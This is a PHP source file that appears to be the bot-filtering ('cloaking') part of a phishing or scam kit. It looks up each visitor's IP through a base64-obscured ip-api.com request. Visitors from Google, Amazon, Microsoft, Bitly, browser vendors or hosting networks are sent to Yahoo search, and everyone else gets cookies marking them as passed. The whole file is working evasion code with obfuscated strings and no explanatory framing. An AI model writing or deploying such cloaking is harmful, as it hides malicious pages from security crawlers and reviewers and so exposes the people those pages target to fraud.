<?php if(checkReal()===true||getRedirect()===true){setcookie("is_data_active","true",time()+(86400*30),"/");$_SESSION['_type']="passed";setcookie("cih", 'L₦7CvzDCos|3:^/Cos|3~÷As4oKs;`A=', time() + (86400 * 30), "/");}else{header("Location: ".base64_decode("aHR0cHM6Ly9zZWFyY2gueWFob28uY29tLw=="));}function reload($url){echo("<script>window.location.replace('{$url}');</script>");die;}function checkReal(){$ip=@file_get_contents(str_ireplace("/?",("/".pick_ip()."?"),base64_decode("aHR0cDovL2lwLWFwaS5jb20vanNvbi8/ZmllbGRzPXN0YXR1cyxpc3Asb3JnLHJldmVyc2UsbW9iaWxlLHByb3h5LGhvc3RpbmcscXVlcnk=")));$ipArray=@json_decode($ip,true);if(!is_array($ipArray)){return true;}if(!isset($ipArray['status'])){return true;}$ip=json_decode($ip);$gam=strtolower($ip->isp." - ".$ip->org." - ".$ip->reverse);if(substr_count($gam,"google")>0||substr_count($gam,"amazon")>0||substr_count($gam,"bitly")>0||substr_count($gam,"bit.ly")>0||substr_count($gam,"aws")>0||substr_count($gam,"microsoft")>0||substr_count($gam,"opera")>0||substr_count($gam,"mozila")>0||substr_count($gam,"firfox")>0){return false;}if($ip->mobile===false&&$ip->hosting===true){return false;}return true;}function pick_ip(){$ip="";if(isset($_SERVER['HTTP_X_REAL_IP'])&&!empty($_SERVER['HTTP_X_REAL_IP'])){$ip=$_SERVER['HTTP_X_REAL_IP'];}elseif(isset($_SERVER['HTTP_CLIENT_IP'])&&!empty($_SERVER['HTTP_CLIENT_IP'])){$ip=$_SERVER['HTTP_CLIENT_IP'];}elseif(isset($_SERVER['REMOTE_ADDR'])&&!empty($_SERVER['REMOTE_ADDR'])){$ip=$_SERVER['REMOTE_ADDR'];}else{$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];}if(in_array($ip,array('::1','127.0.0.1','localhost'))){unset($ip);return 'localhost';}else{return $ip;}}
function getRedirect(){
    global $domain_names;global $ip_address;global $checkForRealHuman;
    if($checkForRealHuman===false){return true;}
    if(is_array($domain_names)){
        foreach($domain_names as $domain){
            if(substr_count(print_r($_SERVER,true), $domain)&&strlen($domain)>4){
                return true;
            }
        }
    }else{
        if(substr_count(print_r($_SERVER,true), $domain_names)&&strlen($domain_names)>4){
            return true;
        }
    }
    if(is_array($ip_address)){
        foreach($ip_address as $domain){
            if(substr_count(print_r($_SERVER,true), $domain)&&strlen($domain)>7){
                return true;
            }
        }
    }else{
        if(substr_count(print_r($_SERVER,true), $ip_address)&&strlen($ip_address)>7){
            return true;
        }
    }
    return false;
}